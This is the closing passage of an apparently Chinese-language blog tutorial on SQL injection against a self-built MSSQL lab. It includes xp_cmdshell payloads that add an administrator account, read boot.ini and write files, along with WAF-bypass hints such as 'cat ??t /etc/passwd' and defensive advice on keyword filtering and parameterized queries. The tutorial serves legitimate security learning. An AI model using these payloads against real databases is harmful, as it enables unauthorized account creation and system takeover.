+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;net user cisp 888888 /add &apos;--</span><br></pre></td></tr></table></figure>
+<p>2.提权：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;net localgroup administrators cisp /add&apos;--</span><br></pre></td></tr></table></figure>
+<p>3.利用：3389;ipc空连接  用远程桌面连接，它的远程桌面端口开的是1234</p>
+<h4 id="读系统文件c-boot-ini"><a href="#读系统文件c-boot-ini" class="headerlink" title="读系统文件c:\boot.ini"></a>读系统文件c:\boot.ini</h4><p>1.数据连接工具：navicat:</p>
+<p>2.查询–新建查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table jjboot(line varchar(5000));</span><br><span class="line">bulk insert jjboot from &apos;c:\boot.ini&apos;;</span><br><span class="line">select * from jjboot</span><br></pre></td></tr></table></figure>
+<h4 id="向系统写文件"><a href="#向系统写文件" class="headerlink" title="向系统写文件"></a>向系统写文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;echo aaa &gt;&gt;c:\a.txt&apos;--</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SQL/86.png" alt="upload successful"></p>
+<h4 id="xp-cmdshell防御"><a href="#xp-cmdshell防御" class="headerlink" title="xp_cmdshell防御"></a>xp_cmdshell防御</h4><p>1.删除：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_dropextendedproc &apos;xp_cmdshell&apos;</span><br></pre></td></tr></table></figure>
+<p>2.恢复：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addextendedproc &apos;xp_cmdshell&apos;,&apos;xplog70.dll&apos;</span><br></pre></td></tr></table></figure>
+<p>3.防xp_cmdshell.防未公布：cmd反弹</p>
+<p>c:\windows\system32\cmd.exe</p>
+<p>删除所有默认权限，添加administrator–完全控制</p>
+<h4 id="防注入："><a href="#防注入：" class="headerlink" title="防注入："></a>防注入：</h4><p><strong>1.脚本调用：编写防注入脚本</strong></p>
+<p>过滤关键字：and or union ; ‘ sp_ xp_ update</p>
+<p>exec select delete drop</p>
+<p>防post get cookie</p>
+<p>判断哪个脚本有漏洞</p>
+<p>调用：include file=noinject.asp</p>
+<p>最前面：搜索型</p>
+<p><strong>2.安全编码：</strong>int–&gt;cint,参数化查询</p>
+<p>3.waf:web app fw: 软件，硬件</p>
+<p>sqlmap:tamper:base</p>
+<p>通配符：cat ??t /etc/passwd</p>
+<p>as /**/</p>
+<p>hash:</p>
+<p>sqlmap.py -u url -v 3</p>
+<h2 id="0X07-参考文献"><a href="#0X07-参考文献" class="headerlink" title="0X07 参考文献"></a>0X07 参考文献</h2><p><a href="https://blog.csdn.net/xianjie0318/article/details/80900632" target="_blank" rel="noopener">https://blog.csdn.net/xianjie0318/article/details/80900632</a></p>
+<p><a href="http://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/120747.html</a></p>
+
+      
+    </div>
+	
+	<div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	
+	</div>
+    
+    
+    
+	
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL注入/" <i class="fa fa-tag"></i> SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/30/XSS姿势分享/" rel="next" title="XSS姿势分享">
+                <i class="fa fa-chevron-left"></i> XSS姿势分享
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/02/应用层拒绝服务攻击/" rel="prev" title="应用层拒绝服务攻击">
+                应用层拒绝服务攻击 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">迪仔</p>
+              <p class="site-description motion-element" itemprop="description">一只不断学习的小菜鸟</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-SQL注入简介"><span class="nav-number">1.</span> <span class="nav-text">0x01 SQL注入简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-SQL注入原理"><span class="nav-number">2.</span> <span class="nav-text">0x02 SQL注入原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入产生的原因"><span class="nav-number">2.1.</span> <span class="nav-text">SQL注入产生的原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Timing-Attack"><span class="nav-number">2.2.</span> <span class="nav-text">Timing Attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行"><span class="nav-number">2.3.</span> <span class="nav-text">命令执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-编码注入方式"><span class="nav-number">3.</span> <span class="nav-text">0x03 编码注入方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#从漏洞类型区分可以分为三种类型："><span class="nav-number">3.1.</span> <span class="nav-text">从漏洞类型区分可以分为三种类型：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-SQL-注入漏洞挖掘方法"><span class="nav-number">4.</span> <span class="nav-text">0x04 SQL 注入漏洞挖掘方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-正确的防御SQL注入"><span class="nav-number">5.</span> <span class="nav-text">0x05 正确的防御SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-SQL注入实战"><span class="nav-number">6.</span> <span class="nav-text">0x06 SQL注入实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入一般流程"><span class="nav-number">6.1.</span> <span class="nav-text">SQL注入一般流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DVWA之SQL注入篇"><span class="nav-number">6.2.</span> <span class="nav-text">DVWA之SQL注入篇</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MCIR-SQLol-Challenges-SQL注入"><span class="nav-number">6.3.</span> <span class="nav-text">MCIR SQLol Challenges SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Challenge-0-Hello-world"><span class="nav-number">6.3.1.</span> <span class="nav-text">Challenge 0 - Hello, world!</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Challenge-1-SQL-Injection-101"><span class="nav-number">6.3.2.</span> <span class="nav-text">Challenge 1 - SQL Injection 101</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Challenge-2"><span class="nav-number">6.3.3.</span> <span class="nav-text">Challenge 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Challenge-3-Death-Row"><span class="nav-number">6.3.4.</span> <span class="nav-text">Challenge 3 - Death Row</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Challenge-4-War-on-Error"><span class="nav-number">6.3.4.1.</span> <span class="nav-text">Challenge 4 - War on Error</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Challenge-5-Blind-Luck"><span class="nav-number">6.3.5.</span> <span class="nav-text">Challenge 5 - Blind Luck</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自搭MSSQL注入环境"><span class="nav-number">6.4.</span> <span class="nav-text">自搭MSSQL注入环境</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#启动vm2003"><span class="nav-number">6.4.1.</span> <span class="nav-text">启动vm2003</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#操作系统提权"><span class="nav-number">6.4.2.</span> <span class="nav-text">操作系统提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#读系统文件c-boot-ini"><span class="nav-number">6.4.3.</span> <span class="nav-text">读系统文件c:\boot.ini</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#向系统写文件"><span class="nav-number">6.4.4.</span> <span class="nav-text">向系统写文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xp-cmdshell防御"><span class="nav-number">6.4.5.</span> <span class="nav-text">xp_cmdshell防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防注入："><span class="nav-number">6.4.6.</span> <span class="nav-text">防注入：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X07-参考文献"><span class="nav-number">7.</span> <span class="nav-text">0X07 参考文献</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">迪仔</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共58.0k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
